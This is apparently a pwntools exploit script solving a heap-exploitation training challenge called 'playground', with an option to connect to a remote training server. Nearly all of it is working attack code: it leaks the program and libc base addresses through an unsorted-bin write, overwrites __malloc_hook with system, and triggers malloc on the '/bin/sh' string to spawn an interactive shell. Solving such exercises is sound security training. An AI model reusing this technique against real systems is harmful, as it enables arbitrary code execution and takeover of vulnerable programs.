from pwn import *
import sys
from time import sleep

CHALL_PATH = "./playground_patch"
CHALL = ELF(CHALL_PATH, checksec=False)
LIBC = ELF("/home/merk/odc/env/libc-2.27.so", checksec=False)

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process(CHALL_PATH) 
        gdb.attach(c, """ 
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("playground.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

def malloc(c, size):
    c.recvuntil(b'> ')
    cmd = b'malloc ' + str(size).encode('utf-8')
    c.sendline(cmd)
    c.recvuntil(b'==> ')
    addr = int(c.recvuntil(b'\n').split(b'0x', 1)[1].strip(), 16)
    return addr

def write(c, addr, content):
    c.recvuntil(b'>' )
    cmd = b'write ' + hex(addr).encode('utf-8') + b' ' + str(len(content)).encode('utf-8')
    c.sendline(cmd)
    c.recvuntil(b'==> read\n')
    c.send(content)
    c.recvuntil(b'==> done\n')

def show(c, addr, size):
    c.recvuntil(b'> ')
    cmd = b'show ' + hex(addr).encode('utf-8') + b' ' + hex(size).encode('utf-8')
    c.sendline(cmd)
    c.recvuntil(b': ')
    show = c.recvline().strip()
    return int(show, 16)

def free(c, addr):
    c.recvuntil(b'> ')
    cmd = b'free ' + hex(addr).encode('utf-8')
    c.sendline(cmd)
    c.recvuntil(b'==> ok')
    print('freed', hex(addr).encode('utf-8'))

# 1st part: leak necessary addresses
# Leak base address
pid = c.recvline()
main = int(c.recvline().split(b'main: 0x', 1)[1].strip(), 16)

CHALL.address = main - CHALL.symbols["main"]
print("base address: ", hex(CHALL.address))

# Leak LIBC base address (allocate something that do not go in tcache)
addr1 = malloc(c, 0x410) 
addr2 = malloc(c, 0x500)

free(c, addr1)

max_heap_loc = CHALL.address + 0x40a0 # offset of max_heap from CHALL.address (p &max_heap)
write(c, addr1 + 0x08, p64(max_heap_loc - 0x10)) # write to max_heap location

addr3 = malloc(c, 0x410)
# now max_heap should be different
leak_libc = show(c, max_heap_loc, 0x1)

malloc_hook_location = leak_libc - 0x70
LIBC.address = malloc_hook_location - LIBC.symbols["__malloc_hook"]
print("LIBC base address: ", hex(LIBC.address))

# 2nd part: pop a shell
sys = LIBC.symbols["system"]
write(c, malloc_hook_location, p64(sys))

# get the pointer to "/bin/sh\x00"
binsh = next(LIBC.search(b'/bin/sh\x00'))

c.recvuntil(b'> ')
cmd = b'malloc ' + str(binsh).encode('utf-8')
c.sendline(cmd)

c.interactive()
